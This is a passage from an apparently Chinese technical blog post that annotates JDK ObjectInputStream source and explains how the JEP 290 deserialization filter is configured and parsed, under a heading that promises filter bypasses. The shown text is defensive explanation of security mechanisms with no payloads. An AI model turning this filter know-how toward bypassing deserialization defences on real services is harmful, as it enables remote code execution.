已指向 obj 的句柄。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 数据来源与路径：</span></span><br><span class="line"><span class="comment"> * 1) slots[i].hasData == true：</span></span><br><span class="line"><span class="comment"> *    a) 若该层声明了 private readObject(ObjectInputStream)：</span></span><br><span class="line"><span class="comment"> *       - 进入块数据模式（Block-Data），反射调用 readObject；</span></span><br><span class="line"><span class="comment"> *       - readObject 内部若调用 defaultReadObject()/readFields()，可能设置 defaultDataEnd；</span></span><br><span class="line"><span class="comment"> *         结束后需把 defaultDataEnd 复位为 false；</span></span><br><span class="line"><span class="comment"> *       - 若该层还声明了 writeObject（即 hasWriteObjectData == true），读取完后还需</span></span><br><span class="line"><span class="comment"> *         skipCustomData() 吞掉“自定义数据块”（直到 TC_ENDBLOCKDATA）；否则直接退出块模式。</span></span><br><span class="line"><span class="comment"> *    b) 否则走默认字段读取：defaultReadFields(obj, slotDesc)。</span></span><br><span class="line"><span class="comment"> * 2) slots[i].hasData == false：</span></span><br><span class="line"><span class="comment"> *    - 若该层声明了 readObjectNoData() 且当前对象有效且未记录异常，则调用之，用于</span></span><br><span class="line"><span class="comment"> *      处理“发送端类层级与接收端不一致”的兼容场景。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// 类层级布局（父 → 子）</span></span><br><span class="line">    ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; slots.length; i++) &#123;</span><br><span class="line">        <span class="type">ObjectStreamClass</span> <span class="variable">slotDesc</span> <span class="operator">=</span> slots[i].desc;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (slots[i].hasData) &#123; <span class="comment">// 该层在流里有数据</span></span><br><span class="line">            <span class="comment">// 若对象不可用（本地类缺失 → obj==null）或此前已在该句柄上记录异常，</span></span><br><span class="line">            <span class="comment">// 则仅消费/跳过该层字段的字节，不尝试填充对象字段。</span></span><br><span class="line">            <span class="keyword">if</span> (obj == <span class="literal">null</span> || handles.lookupException(passHandle) != <span class="literal">null</span>) &#123;</span><br><span class="line">                defaultReadFields(<span class="literal">null</span>, slotDesc); <span class="comment">// 跳过字段值</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 自定义 readObject 路径</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (slotDesc.hasReadObjectMethod()) &#123;</span><br><span class="line">                <span class="type">ThreadDeath</span> <span class="variable">t</span> <span class="operator">=</span> <span class="literal">null</span>;       <span class="comment">// 若 finally 恢复上下文时遇到 ThreadDeath，延后再抛</span></span><br><span class="line">                <span class="type">boolean</span> <span class="variable">reset</span> <span class="operator">=</span> <span class="literal">false</span>;      <span class="comment">// 直到上下文成功复位为止</span></span><br><span class="line">                <span class="type">SerialCallbackContext</span> <span class="variable">oldContext</span> <span class="operator">=</span> curContext;</span><br><span class="line">                <span class="keyword">if</span> (oldContext != <span class="literal">null</span>)</span><br><span class="line">                    oldContext.check();     <span class="comment">// 外层上下文合法性检查（未被重复使用）</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 为该层建立新的“反序列化回调上下文”，允许 defaultReadObject/readFields 合法调用</span></span><br><span class="line">                    curContext = <span class="keyword">new</span> <span class="title class_">SerialCallbackContext</span>(obj, slotDesc);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 按协议：readObject 的自定义数据以 Block-Data 写入，需进入块模式读取</span></span><br><span class="line">                    bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 反射调用类的私有 readObject(ObjectInputStream)</span></span><br><span class="line">                    slotDesc.invokeReadObject(obj, <span class="built_in">this</span>);</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     * 大多数情况下，句柄表已把 CNF 传播到 passHandle；</span></span><br><span class="line"><span class="comment">                     * 若 readObject 内部“新构造并抛出了”一个 CNF，这里补记到句柄上。</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    handles.markException(passHandle, ex);</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    <span class="comment">// 恢复回调上下文（必须保证恢复成功；若中途遇到 ThreadDeath，等 reset 完成后再抛）</span></span><br><span class="line">                    <span class="keyword">do</span> &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            curContext.setUsed(); <span class="comment">// 标记本层上下文已使用完毕，禁止后续再用</span></span><br><span class="line">                            <span class="keyword">if</span> (oldContext != <span class="literal">null</span>)</span><br><span class="line">                                oldContext.check();</span><br><span class="line">                            curContext = oldContext;</span><br><span class="line">                            reset = <span class="literal">true</span>;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (ThreadDeath x) &#123;</span><br><span class="line">                            t = x; <span class="comment">// 暂存，直到 reset==true</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">while</span> (!reset);</span><br><span class="line">                    <span class="keyword">if</span> (t != <span class="literal">null</span>)</span><br><span class="line">                        <span class="keyword">throw</span> t;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * 若自定义 readObject 期间调用了 defaultReadObject()/readFields()，</span></span><br><span class="line"><span class="comment">                 * 可能间接把 defaultDataEnd 置为 true（表示“默认字段块已到末尾，但旧协议无显式 ENDBLOCKDATA”）。</span></span><br><span class="line"><span class="comment">                 * 这里复位为 false，恢复正常读取行为。</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                defaultDataEnd = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 默认字段读取路径</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                defaultReadFields(obj, slotDesc);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取完该层后，若类定义了 writeObject（意味着写端在该层还写了“自定义数据块”），</span></span><br><span class="line">            <span class="comment">// 则需把那段 Block-Data 吞掉至 TC_ENDBLOCKDATA；否则直接退出块模式。</span></span><br><span class="line">            <span class="keyword">if</span> (slotDesc.hasWriteObjectData()) &#123;</span><br><span class="line">                skipCustomData();          <span class="comment">// 读尽自定义块并切回非块模式</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                bin.setBlockDataMode(<span class="literal">false</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// slots[i].hasData == false：该层在流中无数据（层级不匹配等）</span></span><br><span class="line">            <span class="comment">// 若对象有效、未记录异常、该层声明了 readObjectNoData()，则调用之以处理兼容初始化</span></span><br><span class="line">            <span class="keyword">if</span> (obj != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">                slotDesc.hasReadObjectNoDataMethod() &amp;&amp;</span><br><span class="line">                handles.lookupException(passHandle) == <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                slotDesc.invokeReadObjectNoData(obj);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="反序列化检测与绕过"><a href="#反序列化检测与绕过" class="headerlink" title="反序列化检测与绕过"></a>反序列化检测与绕过</h1><h2 id="JEP290"><a href="#JEP290" class="headerlink" title="JEP290"></a>JEP290</h2><p><a class="link"   target="_blank" rel="noopener" href="https://openjdk.org/jeps/290" >JEP 290<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 是 Java 中非常重要的一个安全增强提案，主要用于 <strong>增强 Java 反序列化的安全性控制</strong>。它在 Java 9 中引入，核心思想是 <strong>为反序列化过程增加“白名单”机制</strong>，防止反序列化任意类造成的远程代码执行（RCE）等安全问题。</p>
<blockquote>
<p>JEP 290: Filter Incoming Serialization Data</p>
<p>JEP 290：过滤传入的序列化数据</p>
<p>Allow incoming streams of object-serialization data to be filtered in order to improve both security and robustness.</p>
<p>允许对传入的对象序列化数据流进行过滤，以提升安全性与健壮性。</p>
</blockquote>
<p>虽然这个提案是在 Java9 提出的，但在 JDK6、7、8 的高版本中也引入了这个机制（JDK8u121、JDK7u131、JDK6u141）。</p>
<p>根据官方的描述，核心机制在于一个可以被用户实现的 filter 接口，作为 <code>ObjectInputStream</code> 的一个属性，反序列化时会触发接口的方法，对序列化类进行合法性检查。每个对象在被实例化和反序列化之前，过滤器都会被调用，除去 Java 的基本类型和 <code>java.lang.String</code>（若过滤器未设置，默认使用全局过滤器）。此外，针对 RMI，用于导出远程对象的 <code>UnicastServerRef</code> 中的 <code>MarshalInputStream</code> 也设置了过滤器，用于验证方法参数的合法性。</p>
<h3 id="检测原理"><a href="#检测原理" class="headerlink" title="检测原理"></a>检测原理</h3><p>原生反序列化的入口在 <code>ObjectInputStream#readObject</code>，在这里设置过滤器再合适不过。JEP 290 在 <code>ObjectInputStream</code> 类中增加了一个 <code>serialFilter</code> 属性和一个 <code>filterCheck</code> 方法。</p>
<h4 id="全局默认过滤器"><a href="#全局默认过滤器" class="headerlink" title="全局默认过滤器"></a>全局默认过滤器</h4><h5 id="初始化-serialFilter"><a href="#初始化-serialFilter" class="headerlink" title="初始化 serialFilter"></a>初始化 serialFilter</h5><p><code>ObjectInputStream</code> 的构造方法初始化了 <code>serialFilter</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Filter of class descriptors and classes read from the stream;</span></span><br><span class="line"><span class="comment"> * may be null.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> ObjectInputFilter serialFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">    serialFilter = ObjectInputFilter.Config.getSerialFilter();</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>Config</code> 是 <code>sun.misc.ObjectInputFilter</code> 这个接口的一个静态内部类，<code>getSerialFilter</code> 返回 <code>Config</code> 的静态字段 <code>serialFilter</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回进程范围（全局）的序列化过滤器；如果尚未配置，则返回 &#123;<span class="doctag">@code</span> null&#125;。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;说明：方法在 &#123;<span class="doctag">@code</span> serialFilterLock&#125; 上同步，以确保在多线程环境下</span></span><br><span class="line"><span class="comment"> * 对全局过滤器读取的可见性与一致性。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 全局序列化过滤器；若未配置则为 &#123;<span class="doctag">@code</span> null&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ObjectInputFilter <span class="title function_">getSerialFilter</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (serialFilterLock) &#123; <span class="comment">// 加锁读取，保证并发场景下的可见性</span></span><br><span class="line">        <span class="keyword">return</span> serialFilter;          <span class="comment">// 可能为 null（未通过属性/配置/代码设置）</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这个静态字段在 <code>Config</code> 的静态代码块中进行初始化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 进程范围（全局）的反序列化过滤器属性名。</span></span><br><span class="line"><span class="comment"> * 既可作为系统属性（System Property），也可作为 java.security.Security 的安全属性使用。</span></span><br><span class="line"><span class="comment"> * 实际读取顺序见下方静态代码块：优先读取系统属性，其次读取安全属性。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">SERIAL_FILTER_PROPNAME</span> <span class="operator">=</span> <span class="string">&quot;jdk.serialFilter&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 启动期解析得到的“已配置的”全局过滤器；可能为 null。</span></span><br><span class="line"><span class="comment"> * 实际来源：先查系统属性，再查安全属性；若两者皆无或解析失败，则为 null。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> ObjectInputFilter configuredFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="comment">// 以特权方式读取系统/安全属性（在启用 SecurityManager 的历史场景下需要此调用）。</span></span><br><span class="line">    configuredFilter = AccessController</span><br><span class="line">            .doPrivileged((PrivilegedAction&lt;ObjectInputFilter&gt;) () -&gt; &#123;</span><br><span class="line">                <span class="comment">// 1) 优先从系统属性读取 jdk.serialFilter</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">props</span> <span class="operator">=</span> System.getProperty(SERIAL_FILTER_PROPNAME);</span><br><span class="line">                <span class="keyword">if</span> (props == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 2) 若系统属性未设置，则退回到安全属性（conf/security/java.security）</span></span><br><span class="line">                    props = Security.getProperty(SERIAL_FILTER_PROPNAME);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (props != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 创建日志记录器（JDK 内建 System.Logger，通道：java.io.serialization）</span></span><br><span class="line">                    System.<span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span></span><br><span class="line">                            System.getLogger(<span class="string">&quot;java.io.serialization&quot;</span>);</span><br><span class="line">                    <span class="comment">// 记录将从何处的配置字符串创建过滤器（&#123;0&#125; 为占位符）</span></span><br><span class="line">                    log.log(System.Logger.Level.INFO,</span><br><span class="line">                            <span class="string">&quot;Creating serialization filter from &#123;0&#125;&quot;</span>, props);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">// 解析并构造过滤器实例（支持 ! 前缀、包/模块匹配、以及 maxdepth 等限制项）</span></span><br><span class="line">                        <span class="keyword">return</span> createFilter(props);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (RuntimeException re) &#123;</span><br><span class="line">                        <span class="comment">// 解析失败时记录错误，并回退为 null（表示不启用全局过滤器）</span></span><br><span class="line">                        log.log(System.Logger.Level.ERROR,</span><br><span class="line">                                <span class="string">&quot;Error configuring filter: &#123;0&#125;&quot;</span>, re);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 未配置或解析失败：不启用全局过滤器</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 若确有已配置过滤器，则准备一个日志器供后续配置相关日志使用；否则置空。</span></span><br><span class="line">    <span class="comment">// （configLog 字段应在类中其他位置定义）</span></span><br><span class="line">    configLog = (configuredFilter != <span class="literal">null</span>) ? System.getLogger(<span class="string">&quot;java.io.serialization&quot;</span>) : <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * “当前生效”的全局过滤器。</span></span><br><span class="line"><span class="comment"> * 初始值为启动期解析得到的 configuredFilter；</span></span><br><span class="line"><span class="comment"> * 之后可能被 API（例如 ObjectInputFilter.Config#setSerialFilter）在运行时动态更新。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">ObjectInputFilter</span> <span class="variable">serialFilter</span> <span class="operator">=</span> configuredFilter;</span><br></pre></td></tr></table></figure></div>

<p>这段代码的逻辑是先 <code>System.getProperty(&quot;jdk.serialFilter&quot;)</code>，再 <code>Security.getProperty(&quot;jdk.serialFilter&quot;)</code>；前者存在则覆盖后者。因为默认情况下两者皆为空因此全局过滤器默认为 <code>null</code>。</p>
<p>若有设置这两个全局属性，才会调用 <code>createFilter</code> 函数根据 <code>jdk.serialFilter</code> 属性预先设置的字符串构造序列化过滤器 <code>serialFilter</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从一串“模式（pattern）”文本创建一个 ObjectInputFilter。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;多个模式用分号（;）分隔。⚠ 注意：空白字符是“有意义”的，它属于模式的一部分，</span></span><br><span class="line"><span class="comment"> * 不是自动忽略的空格。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;如果某个模式是“name=value”的赋值形式（即包含等号 =），表示设置一个“限制项（limit）”。</span></span><br><span class="line"><span class="comment"> * 同一限制项出现多次时，以最后一次为准。支持的限制项有：</span></span><br><span class="line"><span class="comment"> *   - maxdepth=value  ：反序列化对象图允许的最大深度</span></span><br><span class="line"><span class="comment"> *   - maxrefs=value   ：已读取对象/引用的最大数量</span></span><br><span class="line"><span class="comment"> *   - maxbytes=value  ：输入流允许的最大字节数</span></span><br><span class="line"><span class="comment"> *   - maxarray=value  ：允许的最大数组长度</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;其他非赋值形式的模式用于“类/包名匹配”，匹配对象是 Class.getName() 的结果，</span></span><br><span class="line"><span class="comment"> *   如果带可选的“模块名”，则还要与 class.getModule().getName() 进行匹配。</span></span><br><span class="line"><span class="comment"> *   注意：数组类型按“元素类型”进行匹配，而不是按“数组类型”本身匹配；</span></span><br><span class="line"><span class="comment"> *   任意维度的数组都视为它的元素类型来匹配。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;以 &quot;!&quot; 开头：当后续模式能匹配到类名时，判定为“拒绝”；否则（不以 &quot;!&quot; 开头），</span></span><br><span class="line"><span class="comment"> *       只要能匹配到就“允许”。（首个命中的模式决定结果）</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;包含 &quot;/&quot;：则 &quot;/&quot; 之前的非空前缀视为“模块名”，先匹配模块名，再用 &quot;/&quot; 之后的部分</span></span><br><span class="line"><span class="comment"> *       去匹配类名；如果不含 &quot;/&quot;，则不比较模块名。</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;以 &quot;.**&quot; 结尾：匹配某包及其所有子包中的任意类。</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;以 &quot;.*&quot; 结尾：匹配某包下（不含子包）的任意类。</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;以 &quot;*&quot; 结尾：按前缀匹配任意类名（前缀可以是完整类名的一部分）。</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;完全等于类名：精确匹配该类。</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;其他情况：不匹配。</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;生成的过滤器会先做“限制项”检查（深度/引用数/字节数/数组长度等），只要超限就返回 REJECTED。</span></span><br><span class="line"><span class="comment"> * 若未超限，再按“类匹配规则”从左到右尝试匹配（数组按元素类型匹配）。</span></span><br><span class="line"><span class="comment"> * 例如模式 &quot;!example.Foo&quot; 将拒绝创建 example.Foo 以及任何维度的 Foo[]。</span></span><br><span class="line"><span class="comment"> * 首个匹配成功的模式决定结果：命中允许则 ALLOWED，命中拒绝则 REJECTED。</span></span><br><span class="line"><span class="comment"> * 若不超限且没有任何模式匹配类名，则返回 UNDECIDED。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> pattern  非 null 的模式字符串</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>         用于检查反序列化类的过滤器；如果解析后没有任何有效模式，则返回 null</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException 当模式不合法或无法解析时抛出，例如：</span></span><br><span class="line"><span class="comment"> *   &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *     &lt;li&gt;限制项缺少名称，或名称不是 &quot;maxdepth&quot;/&quot;maxrefs&quot;/&quot;maxbytes&quot;/&quot;maxarray&quot;</span></span><br><span class="line"><span class="comment"> *     &lt;li&gt;限制项的 value 不能被 Long.parseLong 解析，或为负数</span></span><br><span class="line"><span class="comment"> *     &lt;li&gt;包含 &quot;/&quot; 但缺少模块名或 &quot;/&quot; 之后的类名模式为空</span></span><br><span class="line"><span class="comment"> *     &lt;li&gt;&quot; .* &quot; 或 &quot; .** &quot; 缺少前面的包名（如单独写成 &quot;.*&quot; 或 &quot;.**&quot;）</span></span><br><span class="line"><span class="comment"> *   &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ObjectInputFilter <span class="title function_">createFilter</span><span class="params">(String pattern)</span> &#123;</span><br><span class="line">    Objects.requireNonNull(pattern, <span class="string">&quot;pattern&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> Global.createFilter(pattern);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>字符串的语法规则为：</p>
<ul>
<li><p><strong>由分号 <code>;</code> 分隔的多段规则</strong>组成，<strong>空格算内容</strong>。形式如：<code>rule1;rule2;rule3</code></p>
</li>
<li><p>两类子规则：</p>
<ul>
<li><p><strong>限制项（limit）</strong> ：<code>maxdepth=… / maxrefs=… / maxbytes=… / maxarray=…</code>，例如 <code>maxdepth=64;maxrefs=10000;maxbytes=1048576;maxarray=100000</code>。</p>
</li>
<li><p><strong>类&#x2F;包匹配</strong> ：可写模块前缀、包&#x2F;类名和通配符，前面加 <code>!</code> 表示拒绝。</p>
<ul>
<li><p>模块 + 类：<code>java.base/java.lang.*</code></p>
</li>
<li><p>包及子包：<code>com.acme.**</code></p>
</li>
<li><p>仅当前包：<code>com.acme.*</code></p>
</li>
<li><p>类名前缀：<code>com.acme.Foo*</code></p>
</li>
<li><p>精确类：<code>com.acme.Foo</code></p>
</li>
<li><p>拒绝：前缀 <code>!</code>，如 <code>!org.apache.commons.collections.**</code></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>先检查限制项</strong>（超限直接 <code>REJECTED</code>），再<strong>按顺序匹配类</strong>（命中第一条就决定 <code>ALLOWED</code>&#x2F;<code>REJECTED</code>；都不命中 → <code>UNDECIDED</code>）。</p>
</li>
<li><p><strong>数组按元素类型匹配</strong>（拒 <code>com.evil.Foo</code> 也会拒 <code>Foo[]/Foo[][]</code>）。</p>
</li>
</ul>
<p><code>Config.createFilter</code> 实际调用的是 <code>Global#createFilter</code> 静态方法，内部实际上是实例化并返回了一个 <code>Global</code> 对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从一段“pattern 规则字符串”创建 ObjectInputFilter。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> pattern 要解析的规则字符串（分号 ; 分隔多段）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 用于检查反序列化类的过滤器；如果没有任何非空规则，返回 &#123;<span class="doctag">@code</span> null&#125;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException 参数格式不合法时抛出：</span></span><br><span class="line"><span class="comment"> *         例如限制项缺名字、值不是 long、或为负数等</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> ObjectInputFilter <span class="title function_">createFilter</span><span class="params">(String pattern)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 解析并封装成 Global（实现了 ObjectInputFilter 的逻辑）</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Global</span>(pattern);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnsupportedOperationException uoe) &#123;</span><br><span class="line">        <span class="comment">// 没有任何“非空”的规则段时，按约定返回 null</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>Global</code> 本身就实现了 <code>ObjectInputFilter</code> 接口。<code>Global</code> 的构造函数会解析我们传入的匹配规则 <code>pattern</code>，将规则解析成一个个 lambda 表达式，lambda 表达式会返回 <code>ObjectInputFilter.Status</code>。这些 lambda 表达式组保存在 <code>filters</code> 属性中。</p>
